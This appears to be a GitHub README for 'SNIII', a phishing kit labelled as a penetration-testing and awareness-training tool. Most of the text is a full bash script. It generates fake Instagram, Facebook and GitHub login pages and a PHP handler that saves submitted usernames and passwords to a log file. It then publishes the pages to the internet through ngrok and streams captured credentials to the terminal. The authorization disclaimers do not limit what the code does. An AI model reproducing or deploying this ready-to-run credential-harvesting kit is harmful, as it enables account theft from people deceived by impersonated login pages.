# 🎣(SNIII) 
# Phishing Simulator for Penetration Testing

*A tool for authorized security testing and awareness training.*

---

## 📌 Overview
This tool simulates phishing attacks for **authorized penetration testing** and **security awareness training**. It creates fake login pages for popular services (Instagram, Facebook, GitHub) and logs submitted credentials locally. 

**Disclaimer:** Unauthorized use of this tool is illegal and unethical. Use only with explicit permission.

---

## 🛠 Features
- **Multi-service phishing templates**: Instagram, Facebook, GitHub.
- **Real-time credential logging**: Captures credentials in `logs/creds.txt`.
- **Public URL generation**: Uses `ngrok` to expose pages for remote testing.
- **Responsive design**: Mimics real login pages.

---

## ⚙️ Prerequisites
- Linux/macOS (Windows support untested)
- PHP (`php -v` to check)
- `ngrok` ([Download here](https://ngrok.com/download))
- `jq` (for parsing ngrok URLs)
  ```bash
  sudo apt install jq  # Debian/Ubuntu
  brew install jq      # macOS

---

## 🚀 Installation & Usage
1. Clone the Repository
```bash
git clone https://github.com/mainak-roy-pentest/SNIII.git
cd SNIII
```

2. Run the Tool
 ```bash
chmod +x SNIII.sh
./SNIII.sh
```
3. Select a Target
Choose from the menu:
```bash
1. Instagram
2. Facebook
3. GitHub
4. Exit
```
4. Access the Phishing Page
- Local URL: http://127.0.0.1:[PORT]
- Public URL: Automatically generated via ngrok (e.g., https://abc123.ngrok.io).

## 📂 File Structure
```bash
.
├── sites/
│   ├── instagram/
│   │   ├── index.html       # Fake login page
│   │   ├── submit.php       # Credential handler
│   │   └── logs/creds.txt   # Stored credentials
│   ├── facebook/            # Same structure as above
│   └── github/              # Same structure as above
└── phish_simulator.sh       # Main script
```
## 🔒 Ethical & Legal Notice
- Authorized Use Only: This tool is for legitimate security testing with explicit permission.
- No Malicious Activity: Do not use against systems you do not own or have permission to test.
- Compliance: Adhere to laws like GDPR, CFAA, and local regulations.


## ❓ FAQ
Q: How do I stop the server?
Press CTRL+C in the terminal.

Q: Why is ngrok not working?
Ensure ngrok is installed and authenticated:
```bash
ngrok authtoken YOUR_AUTH_TOKEN
```
Q: Can I add more services?
Yes! Clone a template from sites/instagram/ and modify index.html/submit.php.
## 📬 Contact
For questions or ethical concerns:

📧 Email: mainakr455@gmail.com

## 📝 If the SNIII does not function properly, please take the following action.

```bash
1. touch sniii.sh
2. vim sniii.sh

3. #!/bin/bash

# Disclaimer and legal notice with SNIPI logo
echo "=============================================="
echo "   _____  _   _ _____ _____ _____ "
echo "  / ____|| \ | ||_   _|_   _|_   _|"
echo " | (___  |  \| |  | |   | |   | |  "
echo "  \___ \ | . \ |  | |   | |   | |  "
echo "  ____) || |\  | _| |_ _| |_ _| |_ "
echo " |_____/ |_| \_||_____|_____|_____|"
echo "=============================================="
echo "  PHISHING SIMULATOR FOR PENETRATION TESTING  "
echo "=============================================="
echo "This tool is for authorized security testing only."
echo "Unauthorized use is illegal and unethical."
echo "By proceeding, you confirm you have explicit permission."
echo "=============================================="
read -p "Press ENTER to continue or CTRL+C to exit."

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
    echo "[!] Error: ngrok is not installed. Please install ngrok first."
    echo "[*] Download ngrok from: https://ngrok.com/download"
    exit 1
fi

# Directory setup
mkdir -p sites/{instagram,facebook,github}/logs

# Function to generate a fake login page and submission handler
generate_phish_page() {
    local service=$1
    local page_path="sites/$service/index.html"
    local submit_path="sites/$service/submit.php"

    # Generate the fake login page
    cat > "$page_path" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>$service Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; text-align: center; padding: 50px; }
        .login-box { background: white; width: 300px; margin: 0 auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
        button { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>$service</h2>
        <form action="submit.php" method="POST">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
EOF

    # Generate the PHP script to handle form submission
    cat > "$submit_path" <<EOF
<?php
\$username = \$_POST['username'];
\$password = \$_POST['password'];
\$log_file = "logs/creds.txt";

// Ensure the logs directory exists
if (!file_exists("logs")) {
    mkdir("logs", 0777, true);
}

file_put_contents(\$log_file, "Service: $service\nUsername: \$username\nPassword: \$password\n\n", FILE_APPEND);
header("Location: /");
exit;
?>
EOF

    # Create the creds.txt file if it doesn't exist
    touch "sites/$service/logs/creds.txt"
}

# Function to start PHP server and log data with public URL
start_phish_server() {
    local service=$1
    local port=$2

    echo "[*] Starting PHP server for $service on port $port..."
    php -S 127.0.0.1:$port -t "sites/$service/" > /dev/null 2>&1 &

    echo "[*] Exposing the server to the internet using ngrok..."
    ngrok http $port > /dev/null 2>&1 &

    # Wait for ngrok to initialize
    sleep 5

    # Fetch the public URL from ngrok
    public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')

    if [ -z "$public_url" ]; then
        echo "[!] Failed to fetch ngrok URL. Ensure ngrok is running and try again."
        exit 1
    fi

    echo "[+] Fake $service login page is live at:"
    echo "[+] Local URL: http://127.0.0.1:$port"
    echo "[+] Public URL: $public_url"
    echo "[*] Waiting for credentials..."

    # Create the creds.txt file if it doesn't exist
    touch "sites/$service/logs/creds.txt"

    # Monitor the log file in real-time
    tail -f "sites/$service/logs/creds.txt" | while read -r line; do
        echo "[+] Captured: $line"
    done
}

# Main menu
menu() {
    clear
    echo "========== PHISHING SIMULATOR MENU =========="
    echo "1. Instagram"
    echo "2. Facebook"
    echo "3. GitHub"
    echo "4. Exit"
    echo "=============================================="
    read -p "Select a target: " choice

    case $choice in
        1) generate_phish_page "instagram"; start_phish_server "instagram" 5555 ;;
        2) generate_phish_page "facebook"; start_phish_server "facebook" 5556 ;;
        3) generate_phish_page "github"; start_phish_server "github" 5557 ;;
        4) exit 0 ;;
        *) echo "Invalid option!"; sleep 1; menu ;;
    esac
}

# Start the tool
menu

```
🔹Please ensure that Ngrok and PHP are properly downloaded and installed.
